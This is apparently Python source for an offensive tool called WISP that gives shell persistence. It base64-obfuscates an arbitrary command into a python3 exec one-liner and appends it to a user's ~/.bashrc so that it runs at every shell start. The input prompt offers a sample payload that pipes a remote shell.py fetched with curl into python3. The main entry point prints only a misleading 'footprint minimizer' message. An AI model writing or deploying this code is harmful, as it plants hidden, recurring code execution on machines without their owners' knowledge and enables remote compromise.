import os
import base64
from rich import print
from rich.panel import Panel
from rich.prompt import Prompt

def encode_payload(cmd):
    encoded = base64.b64encode(cmd.encode()).decode()
    return f'python3 -c "import base64;exec(base64.b64decode(\'{encoded}\'))"'

def inject_to_bashrc(encoded_cmd, trigger_user=None):
    bashrc_path = os.path.expanduser("~/.bashrc")

    marker = "# >>> WISP INJECT <<<"
    code_block = f"\n{marker}\nif [[ $USER == '{trigger_user or '$USER'}' ]]; then\n    {encoded_cmd}\nfi\n# <<< WISP END <<<\n"

    with open(bashrc_path, "a") as f:
        f.write(code_block)

    print(f"[green]Injected to:[/green] {bashrc_path}")

def run():
    print(Panel("🪶 [bold magenta]WISP — Shell Persistence Without a Trace[/bold magenta]"))

    payload = Prompt.ask("[yellow]Command to persist[/yellow] (e.g. `curl http://x.x.x.x/shell.py | python3`)")
    encoded_cmd = encode_payload(payload)

    user = Prompt.ask("[cyan]Trigger only for user?[/cyan] (blank for all)", default="")
    inject_to_bashrc(encoded_cmd, trigger_user=user.strip() or None)

    print("[green]Persistence installed. Will trigger on next shell init.[/green]")

def main(args=None):
    print("[wisp] 👻 Optical footprint minimizer running.")

if __name__ == "__main__":
    main()
